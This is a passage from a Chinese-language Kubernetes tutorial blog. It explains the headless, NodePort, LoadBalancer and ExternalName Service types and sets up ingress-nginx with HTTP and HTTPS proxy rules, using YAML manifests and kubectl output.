class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">  <span class="attr">clusterIP:</span> <span class="string">None</span> <span class="comment"># 将clusterIP设置为None，即可创建headliness Service</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">ClusterIP</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">80</span>    </span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建service</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f service-headliness.yaml</span><br><span class="line">service/service-headliness created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取service， 发现CLUSTER-IP未分配</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get svc service-headliness -n dev -o wide</span><br><span class="line">NAME                 TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)   AGE   SELECTOR</span><br><span class="line">service-headliness   ClusterIP   None         &lt;none&gt;        80/TCP    11s   app=nginx-pod</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看service详情</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe svc service-headliness  -n dev</span><br><span class="line">Name:              service-headliness</span><br><span class="line">Namespace:         dev</span><br><span class="line">Labels:            &lt;none&gt;</span><br><span class="line">Annotations:       &lt;none&gt;</span><br><span class="line">Selector:          app=nginx-pod</span><br><span class="line">Type:              ClusterIP</span><br><span class="line">IP:                None</span><br><span class="line">Port:              &lt;unset&gt;  80/TCP</span><br><span class="line">TargetPort:        80/TCP</span><br><span class="line">Endpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80</span><br><span class="line">Session Affinity:  None</span><br><span class="line">Events:            &lt;none&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看域名的解析情况</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh</span><br><span class="line">/ # cat /etc/resolv.conf</span><br><span class="line">nameserver 10.96.0.10</span><br><span class="line">search dev.svc.cluster.local svc.cluster.local cluster.local</span><br><span class="line"></span><br><span class="line">[root@k8s-master01 ~]# dig @10.96.0.10 service-headliness.dev.svc.cluster.local</span><br><span class="line">service-headliness.dev.svc.cluster.local. 30 IN A 10.244.1.40</span><br><span class="line">service-headliness.dev.svc.cluster.local. 30 IN A 10.244.1.39</span><br><span class="line">service-headliness.dev.svc.cluster.local. 30 IN A 10.244.2.33</span><br></pre></td></tr></table></figure><h3 id="7-3-4-NodePort类型的Service"><a href="#7-3-4-NodePort类型的Service" class="headerlink" title="7.3.4 NodePort类型的Service"></a>7.3.4 NodePort类型的Service</h3><p>在之前的样例中，创建的Service的ip地址只有集群内部才可以访问，如果希望将Service暴露给集群外部使用，那么就要使用到另外一种类型的Service，称为NodePort类型。NodePort的工作原理其实就是<strong>将service的端口映射到Node的一个端口上</strong>，然后就可以通过<code>NodeIp:NodePort</code>来访问service了。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200620175731338-20220719083322180.png" alt="img"></p><p>创建service-nodeport.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">service-nodeport</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span> <span class="comment"># service类型</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">nodePort:</span> <span class="number">30002</span> <span class="comment"># 指定绑定的node的端口(默认的取值范围是：30000-32767), 如果不指定，会默认分配</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建service</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f service-nodeport.yaml</span><br><span class="line">service/service-nodeport created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看service</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get svc -n dev -o wide</span><br><span class="line">NAME               TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)       SELECTOR</span><br><span class="line">service-nodeport   NodePort   10.105.64.191   &lt;none&gt;        80:30002/TCP  app=nginx-pod</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接下来可以通过电脑主机的浏览器去访问集群中任意一个nodeip的30002端口，即可访问到pod</span></span><br></pre></td></tr></table></figure><h3 id="7-3-5-LoadBalancer类型的Service"><a href="#7-3-5-LoadBalancer类型的Service" class="headerlink" title="7.3.5 LoadBalancer类型的Service"></a>7.3.5 LoadBalancer类型的Service</h3><p>LoadBalancer和NodePort很相似，目的都是向外部暴露一个端口，区别在于LoadBalancer会在集群的外部再来做一个负载均衡设备，而这个设备需要外部环境支持的，外部服务发送到这个设备上的请求，会被设备负载之后转发到集群中。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200510103945494-20220719083322225.png" alt="img"></p><h3 id="7-3-6-ExternalName类型的Service"><a href="#7-3-6-ExternalName类型的Service" class="headerlink" title="7.3.6 ExternalName类型的Service"></a>7.3.6 ExternalName类型的Service</h3><p>ExternalName类型的Service用于引入集群外部的服务，它通过<code>externalName</code>属性指定外部一个服务的地址，然后在集群内部访问此service就可以访问到外部的服务了。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200510113311209-20220719083322266.png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: service-externalname</span><br><span class="line">  namespace: dev</span><br><span class="line">spec:</span><br><span class="line">  type: ExternalName # service类型</span><br><span class="line">  externalName: www.baidu.com  #改成ip地址也可以</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建service</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl  create -f service-externalname.yaml</span><br><span class="line">service/service-externalname created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">域名解析</span></span><br><span class="line">[root@k8s-master01 ~]# dig @10.96.0.10 service-externalname.dev.svc.cluster.local</span><br><span class="line">service-externalname.dev.svc.cluster.local. 30 IN CNAME www.baidu.com.</span><br><span class="line">www.baidu.com.          30      IN      CNAME   www.a.shifen.com.</span><br><span class="line">www.a.shifen.com.       30      IN      A       39.156.66.18</span><br><span class="line">www.a.shifen.com.       30      IN      A       39.156.66.14</span><br></pre></td></tr></table></figure><h2 id="7-4-Ingress介绍"><a href="#7-4-Ingress介绍" class="headerlink" title="7.4 Ingress介绍"></a>7.4 Ingress介绍</h2><p>在前面课程中已经提到，Service对集群之外暴露服务的主要方式有两种：NotePort和LoadBalancer，但是这两种方式，都有一定的缺点：</p><ul><li>NodePort方式的缺点是会占用很多集群机器的端口，那么当集群服务变多的时候，这个缺点就愈发明显</li><li>LB方式的缺点是每个service需要一个LB，浪费、麻烦，并且需要kubernetes之外设备的支持</li></ul><p>基于这种现状，kubernetes提供了Ingress资源对象，Ingress只需要一个NodePort或者一个LB就可以满足暴露多个Service的需求。工作机制大致如下图表示：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200623092808049-20220719083322319.png" alt="img"></p><p>实际上，Ingress相当于一个7层的负载均衡器，是kubernetes对反向代理的一个抽象，它的工作原理类似于Nginx，可以理解成在<strong>Ingress里建立诸多映射规则，Ingress Controller通过监听这些配置规则并转化成Nginx的反向代理配置 , 然后对外部提供服务</strong>。在这里有两个核心概念：</p><ul><li>ingress：kubernetes中的一个对象，作用是定义请求如何转发到service的规则</li><li>ingress controller：具体实现反向代理及负载均衡的程序，对ingress定义的规则进行解析，根据配置的规则来实现请求转发，实现方式有很多，比如Nginx, Contour, Haproxy等等</li></ul><p>Ingress（以Nginx为例）的工作原理如下：</p><ol><li>用户编写Ingress规则，说明哪个域名对应kubernetes集群中的哪个Service</li><li>Ingress控制器动态感知Ingress服务规则的变化，然后生成一段对应的Nginx反向代理配置</li><li>Ingress控制器会将生成的Nginx配置写入到一个运行着的Nginx服务中，并动态更新</li><li>到此为止，其实真正在工作的就是一个Nginx了，内部配置了用户定义的请求转发规则</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200516112704764-20220719083322380.png" alt="img"></p><h2 id="7-5-Ingress使用"><a href="#7-5-Ingress使用" class="headerlink" title="7.5 Ingress使用"></a>7.5 Ingress使用</h2><h3 id="7-5-1-环境准备"><a href="#7-5-1-环境准备" class="headerlink" title="7.5.1 环境准备"></a>7.5.1 环境准备</h3><p><strong>搭建ingress环境</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line">[root<span class="meta">@k8s-master01</span> ~]<span class="comment"># mkdir ingress-controller</span></span><br><span class="line">[root<span class="meta">@k8s-master01</span> ~]<span class="comment"># cd ingress-controller/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取ingress-nginx，本次案例使用的是0.30版本</span></span><br><span class="line">[root<span class="meta">@k8s-master01</span> ingress-controller]<span class="comment"># wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/mandatory.yaml</span></span><br><span class="line">[root<span class="meta">@k8s-master01</span> ingress-controller]<span class="comment"># wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改mandatory.yaml文件中的仓库</span></span><br><span class="line"><span class="comment"># 修改quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0</span></span><br><span class="line"><span class="comment"># 为quay-mirror.qiniu.com/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0</span></span><br><span class="line"><span class="comment"># 创建ingress-nginx</span></span><br><span class="line">[root<span class="meta">@k8s-master01</span> ingress-controller]<span class="comment"># kubectl apply -f ./</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看ingress-nginx</span></span><br><span class="line">[root<span class="meta">@k8s-master01</span> ingress-controller]<span class="comment"># kubectl get pod -n ingress-nginx</span></span><br><span class="line">NAME                                           READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod/nginx-ingress-controller-fbf967dd5-4qpbp   1/1     Running   0          12h</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看service</span></span><br><span class="line">[root<span class="meta">@k8s-master01</span> ingress-controller]<span class="comment"># kubectl get svc -n ingress-nginx</span></span><br><span class="line">NAME            TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)                      AGE</span><br><span class="line">ingress-nginx   NodePort   10.98.75.163   <span class="variable">&lt;none&gt;</span>        80:32240/TCP,443:31335/TCP   11h</span><br></pre></td></tr></table></figure><p><strong>准备service和pod</strong></p><p>为了后面的实验比较方便，创建如下图所示的模型</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200516102419998-20220719083322430.png" alt="img"></p><p>创建tomcat-nginx.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-deployment</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">tomcat-deployment</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">tomcat-pod</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">tomcat-pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tomcat</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">tomcat:8.5-jre10-slim</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-service</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">  <span class="attr">clusterIP:</span> <span class="string">None</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">ClusterIP</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">tomcat-service</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">tomcat-pod</span></span><br><span class="line">  <span class="attr">clusterIP:</span> <span class="string">None</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">ClusterIP</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f tomcat-nginx.yaml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get svc -n dev</span><br><span class="line">NAME             TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)    AGE</span><br><span class="line">nginx-service    ClusterIP   None         &lt;none&gt;        80/TCP     48s</span><br><span class="line">tomcat-service   ClusterIP   None         &lt;none&gt;        8080/TCP   48s</span><br></pre></td></tr></table></figure><h3 id="7-5-2-Http代理"><a href="#7-5-2-Http代理" class="headerlink" title="7.5.2 Http代理"></a>7.5.2 Http代理</h3><p>创建ingress-http.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">extensions/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-http</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="string">nginx.itheima.com</span></span><br><span class="line">    <span class="attr">http:</span></span><br><span class="line">      <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">serviceName:</span> <span class="string">nginx-service</span></span><br><span class="line">          <span class="attr">servicePort:</span> <span class="number">80</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="string">tomcat.itheima.com</span></span><br><span class="line">    <span class="attr">http:</span></span><br><span class="line">      <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">serviceName:</span> <span class="string">tomcat-service</span></span><br><span class="line">          <span class="attr">servicePort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f ingress-http.yaml</span><br><span class="line">ingress.extensions/ingress-http created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get ing ingress-http -n dev</span><br><span class="line">NAME           HOSTS                                  ADDRESS   PORTS   AGE</span><br><span class="line">ingress-http   nginx.itheima.com,tomcat.itheima.com             80      22s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看详情</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe ing ingress-http  -n dev</span><br><span class="line">...</span><br><span class="line">Rules:</span><br><span class="line">Host                Path  Backends</span><br><span class="line">----                ----  --------</span><br><span class="line">nginx.itheima.com   / nginx-service:80 (10.244.1.96:80,10.244.1.97:80,10.244.2.112:80)</span><br><span class="line">tomcat.itheima.com  / tomcat-service:8080(10.244.1.94:8080,10.244.1.95:8080,10.244.2.111:8080)</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接下来,在本地电脑上配置host文件,解析上面的两个域名到192.168.109.100(master)上</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">然后,就可以分别访问tomcat.itheima.com:32240  和  nginx.itheima.com:32240 查看效果了</span></span><br></pre></td></tr></table></figure><h3 id="7-5-3-Https代理"><a href="#7-5-3-Https代理" class="headerlink" title="7.5.3 Https代理"></a>7.5.3 Https代理</h3><p>创建证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成证书</span></span><br><span class="line">openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj &quot;/C=CN/ST=BJ/L=BJ/O=nginx/CN=itheima.com&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建密钥</span></span><br><span class="line">kubectl create secret tls tls-secret --key tls.key --cert tls.crt</span><br></pre></td></tr></table></figure><p>创建ingress-https.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">extensions/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-https</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">tls:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">hosts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">nginx.itheima.com</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">tomcat.itheima.com</span></span><br><span class="line">      <span class="attr">secretName:</span> <span class="string">tls-secret</span> <span class="comment"># 指定秘钥</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="string">nginx.itheima.com</span></span><br><span class="line">    <span class="attr">http:</span></span><br><span class="line">      <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">serviceName:</span> <span class="string">nginx-service</span></span><br><span class="line">          <span class="attr">servicePort:</span> <span class="number">80</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="string">tomcat.itheima.com</span></span><br><span class="line">    <span class="attr">http:</span></span><br><span class="line">      <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">serviceName:</span> <span class="string">tomcat-service</span></span><br><span class="line">          <span class="attr">servicePort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span 